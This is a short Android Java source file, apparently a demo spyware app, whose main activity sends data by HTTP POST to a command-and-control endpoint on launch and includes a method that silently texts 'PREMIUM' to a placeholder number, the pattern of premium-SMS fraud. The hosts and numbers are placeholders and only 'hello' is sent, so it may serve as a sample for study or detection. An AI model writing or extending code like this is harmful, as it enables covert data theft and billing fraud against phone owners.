package com.demo.spy;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import java.net.HttpURLConnection;
import java.net.URL;
public class MainActivity extends Activity {
  static final String C2 = "https://c2.example.invalid/api/v1/collect";
  @Override protected void onCreate(Bundle b) { super.onCreate(b); exfil("hello"); }
  static void exfil(String data) {
    try {
      HttpURLConnection c = (HttpURLConnection) new URL(C2).openConnection();
      c.setRequestMethod("POST"); c.setDoOutput(true); c.getOutputStream().write(data.getBytes()); c.getResponseCode();
    } catch (Exception e) { }
  }
  public static void sendPremium() { SmsManager.getDefault().sendTextMessage("+10000000000", null, "PREMIUM", null, null); }
}
